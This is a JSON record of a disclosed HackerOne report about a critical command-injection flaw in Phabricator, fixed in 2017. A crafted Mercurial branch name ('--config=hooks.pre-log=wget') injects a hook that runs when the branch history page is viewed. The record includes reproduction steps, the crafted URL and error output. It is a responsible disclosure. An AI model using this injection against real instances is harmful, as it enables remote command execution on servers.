@@ -1,0 +1,221 @@
+{
+  "id": 288704,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODg3MDQ=",
+  "url": "https://hackerone.com/reports/288704",
+  "title": "Command injection on Phabricator instance with an evil hg branch name",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2017-11-09T08:57:35.077Z",
+  "submitted_at": "2017-11-09T08:57:35.077Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "criticalonly",
+    "url": "/criticalonly",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/6p3xsu3d9e8ncya2t2pnjt10c9d5/47c72a82657a929c13ab24e11674f7e10ea2bf67b1b9e7116b522cd7ede42f15"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 18,
+    "url": "https://hackerone.com/phabricator",
+    "handle": "phabricator",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/018/61446f7e6f0684c8c9f7c36c918b7ecd58183588_original.jpg/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Phabricator",
+      "twitter_handle": "phabricator",
+      "website": "http://phacility.com/phabricator/",
+      "about": "Phabricator is a collection of open source web applications that help software companies build better software."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-11-11T00:42:44.118Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-11-11T00:42:43.979Z",
+  "team_member_agreed_on_going_public_at": "2017-11-10T16:49:58.513Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi phabricator,\n\nI found an evil branch name of hg a repo can lead to arbitrary command injection on phabricator instance.\n\nHere is the reproduction steps:\n1. Monitor a remote mercurial repo with phabricator;\n2. Create a branch and called \"--config=hooks.pre-log=wget\" on the remote;\n3. After phabricator update the remote repo,visit the history page of that crafted branch;\n```\nhttp://instanceip/source/hgclone/history/--config%253Dhooks.pre-log%253Dwget/\n```\n4. It will raise an error like below and the wget command will be executed;\n5. I test this issue both on my own server instance and the cloud instance with mercurial 4.4(latest) installed(on my server).\n\n```\nCommand failed with error #255! COMMAND hg --config ui.ssh='/data/phabricator/phabricator/bin/ssh-\nconnect' log --debug --template '{node};{parents}\\n' --limit 101 -b '--config=hooks.pre-log=wget' --rev \n'reverse(ancestors('\\''84e8c5feb4faba2f1b230575e747c3bffe7c7a3c'\\''))' STDOUT running hook pre-log: \nwget STDERR not trusting file /var/repo/3/.hg/hgrc from untrusted user root, group root not trusting file \n/var/repo/3/.hg/hgrc from untrusted user root, group root wget: missing URL Usage: wget [OPTION]... \n[URL]... Try `wget --help' for more options. abort: pre-log hook exited with status 1\n```\nThe root cause is that the branch name inject to the hg command directly and that define a hook will run before the hg log command been executed.\nThanks!",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 237921,
+      "file_name": "evil_hg_branch_name_command_injection.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/237/921/7ec657be3a8e22865edac940b577af482656abf8/evil_hg_branch_name_command_injection.png?response-content-disposition=attachment%3B%20filename%3D%22evil_hg_branch_name_command_injection.png%22%3B%20filename%2A%3DUTF-8%27%27evil_hg_branch_name_command_injection.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWDBXSTM4%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T061600Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDnq%2BPhcqPHl0YkV%2Bq%2BTFUaNNaQygvFYg2yigSqyX7JrgIgPazQxolAcT3R01t88i8kGyefpZz1Ozv4U72qDgsy%2Fk8qsQUIfxADGgwwMTM2MTkyNzQ4NDkiDNmKovdqhopOzlIqpCqOBZq9HyF7lHn8FBmTkl8M3zs93zDMzxcskX5%2Bts18loLyPTkWTTO5lXivZ176ozRe805EF5A3CnAt9j5uAiFYzVEfvwVJWF87ZVUeOIGTBKbStGubMDbiP4D2Lo71Jpw2hU9%2FpNksgtVMF%2FSIzhFaiQcE4P1vjuXqAY4GvxTEDRqOWXqjjQ%2Bmcx%2FZkiDLBsqoaVXXvJxKgwp86WKUEKlOb4fADwxAXPKtFuwN6LMK4x9hae9MFpDdiEFbxE5bOricKGqqHztFYZB%2FGd44Ho%2B373UOGtlRTOKHAcMMyT%2FeRvmLCW3XH3VXyelU1n5dLLAUswOMQuSpwOM4qYliVW5K3rjrm805WWm5HpGVXmwSlME3E4xZ8HpBN0Dw7ArmEh%2Bw%2FqFLvLaYqJoiCwMFxx2BlH1igLehwt8RO5Y9g0kiXnGjXpO%2BNuFbDBFXL4NS4u4FI%2BTvT7D3%2BByjfvycwtnbTk1mHGaRTo2wrPqqPZmt8GgPoj4rULgFlqR9njbtDvQPcdFOvf%2B5oGAF10wIa3Vol7I3Y8oWK2CyrCLRHuiB%2B9AuYM9lUE1Tnq2AcBnlThoRGEB%2BWZyl1sU16nwmNDwx%2Bbbu40wmQ1gmj7Lax0ZJ5ei3HmTKD68SNMaGrK9H12V4eeiGtgylanSQGRZArV58bZVvRjKIZAUcU1xQEj5n2k6XGSVp475MFPYfdj8c0jrDmeUX9Lgow43lRH94%2FQ7k2YJAH6FNFCh5XAUaI18eEVY%2Fu5FwY6TRWdX3z%2FkT2d%2BzBM2Y6Ypy6HMSwyjMfJ8B%2ByKY5FV3qTaMzmNDQNH2GvwSf7d2CX0xBVLVjXxFKZQDfXr3mGLRsMy2E3mrboMlWYlzngCKUuR4uYbesG7%2BQzCwyLfSBjqxAZfR9uFUtYPklLRmGcHc%2BTxs48LfDPK0weqx0Q3Zd82N4w%2FHe%2BwdaFJXWgs5yx%2BDPxMOUCh%2FVLt6hs%2Fb7JxUaW8%2FAcKp2u7X8Ep9OKoLH2banI1bm4zApB4ofeNTKKbseT7STIlIHaphF8ldQiOqzNs7bAvJcFzXo1ILBdm6bkqKarjlnT%2B6ZYu1kCTu0JHy1mTouPuFQkkEykJhVcSM10Q78xmhhOGC5tp576jP8wbd4w%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c91d24d793a8cf00be1c9ba7fbbad38f9a0fde6ced4ebdd39429725d1856e957",
+      "file_size": 49085,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 237923,
+      "file_name": "evil_hg_branch_name_command_injection_cloud.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/237/923/09a969f6698aefcd9d99271d0600471b28e4c279/evil_hg_branch_name_command_injection_cloud.png?response-content-disposition=attachment%3B%20filename%3D%22evil_hg_branch_name_command_injection_cloud.png%22%3B%20filename%2A%3DUTF-8%27%27evil_hg_branch_name_command_injection_cloud.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWDBXSTM4%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T061600Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDnq%2BPhcqPHl0YkV%2Bq%2BTFUaNNaQygvFYg2yigSqyX7JrgIgPazQxolAcT3R01t88i8kGyefpZz1Ozv4U72qDgsy%2Fk8qsQUIfxADGgwwMTM2MTkyNzQ4NDkiDNmKovdqhopOzlIqpCqOBZq9HyF7lHn8FBmTkl8M3zs93zDMzxcskX5%2Bts18loLyPTkWTTO5lXivZ176ozRe805EF5A3CnAt9j5uAiFYzVEfvwVJWF87ZVUeOIGTBKbStGubMDbiP4D2Lo71Jpw2hU9%2FpNksgtVMF%2FSIzhFaiQcE4P1vjuXqAY4GvxTEDRqOWXqjjQ%2Bmcx%2FZkiDLBsqoaVXXvJxKgwp86WKUEKlOb4fADwxAXPKtFuwN6LMK4x9hae9MFpDdiEFbxE5bOricKGqqHztFYZB%2FGd44Ho%2B373UOGtlRTOKHAcMMyT%2FeRvmLCW3XH3VXyelU1n5dLLAUswOMQuSpwOM4qYliVW5K3rjrm805WWm5HpGVXmwSlME3E4xZ8HpBN0Dw7ArmEh%2Bw%2FqFLvLaYqJoiCwMFxx2BlH1igLehwt8RO5Y9g0kiXnGjXpO%2BNuFbDBFXL4NS4u4FI%2BTvT7D3%2BByjfvycwtnbTk1mHGaRTo2wrPqqPZmt8GgPoj4rULgFlqR9njbtDvQPcdFOvf%2B5oGAF10wIa3Vol7I3Y8oWK2CyrCLRHuiB%2B9AuYM9lUE1Tnq2AcBnlThoRGEB%2BWZyl1sU16nwmNDwx%2Bbbu40wmQ1gmj7Lax0ZJ5ei3HmTKD68SNMaGrK9H12V4eeiGtgylanSQGRZArV58bZVvRjKIZAUcU1xQEj5n2k6XGSVp475MFPYfdj8c0jrDmeUX9Lgow43lRH94%2FQ7k2YJAH6FNFCh5XAUaI18eEVY%2Fu5FwY6TRWdX3z%2FkT2d%2BzBM2Y6Ypy6HMSwyjMfJ8B%2ByKY5FV3qTaMzmNDQNH2GvwSf7d2CX0xBVLVjXxFKZQDfXr3mGLRsMy2E3mrboMlWYlzngCKUuR4uYbesG7%2BQzCwyLfSBjqxAZfR9uFUtYPklLRmGcHc%2BTxs48LfDPK0weqx0Q3Zd82N4w%2FHe%2BwdaFJXWgs5yx%2BDPxMOUCh%2FVLt6hs%2Fb7JxUaW8%2FAcKp2u7X8Ep9OKoLH2banI1bm4zApB4ofeNTKKbseT7STIlIHaphF8ldQiOqzNs7bAvJcFzXo1ILBdm6bkqKarjlnT%2B6ZYu1kCTu0JHy1mTouPuFQkkEykJhVcSM10Q78xmhhOGC5tp576jP8wbd4w%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ea471ad80b6ca37ab2d29e1b5b7ef17988edf28226318247ad049eab0155817a",
+      "file_size": 72177,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-12-10T16:49:58.678Z",
+  "allow_singular_disclosure_after": -270566761.98870844,
+  "singular_disclosure_allowed": true,
+  "vote_count": 41,
+  "voters": [
+    "cxzer0",
+    "m4khn0",
+    "jr0ch17",
+    "europa",
+    "hunter",
+    "sameerphad72",
+    "michiel",
+    "criticalonly",
+    "bl4de",
+    "spam404",
+    "and 31 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.9,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "288704",
+  "votes": 41,
+  "latest_disclosable_activity_at": "2017-11-11T00:42:44.170Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T14:16:00.781539",
+    "source": "https://hackerone.com/reports/288704.json",
+    "report_id": 288704
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODg3MDQ=",
+    "databaseId": "288704",
+    "title": "Command injection on Phabricator instance with an evil hg branch name",
+    "url": "https://hackerone.com/reports/288704",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2017-11-11T00:42:44.118Z",
+    "created_at": "2017-11-09T08:57:35.077Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzU4",
+      "name": "Command Injection - Generic",
+      "external_id": "cwe-77"
+    },
+    "severity": {
+      "rating": "critical",
+      "score": 9.9
+    },
+    "reporter": {
+      "username": "criticalonly"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE4",
+      "handle": "phabricator",
+      "name": "Phabricator",
+      "url": "https://hackerone.com/phabricator",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS82NDc4OA==",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2017-11-10T16:49:37.793Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzI4ODcwNA==",
+    "_id": "288704",
+    "disclosed": true,
+    "votes": 41,
+    "latest_disclosable_activity_at": "2017-11-11T00:42:44.170Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODg3MDQ=",
+      "databaseId": "288704",
+      "title": "Command injection on Phabricator instance with an evil hg branch name",
+      "url": "https://hackerone.com/reports/288704",
+      "disclosed_at": "2017-11-11T00:42:44.118Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE4",
+      "handle": "phabricator",
+      "name": "Phabricator",
+      "url": "https://hackerone.com/phabricator",
+      "currency": "usd"
+    }
+  }
+}
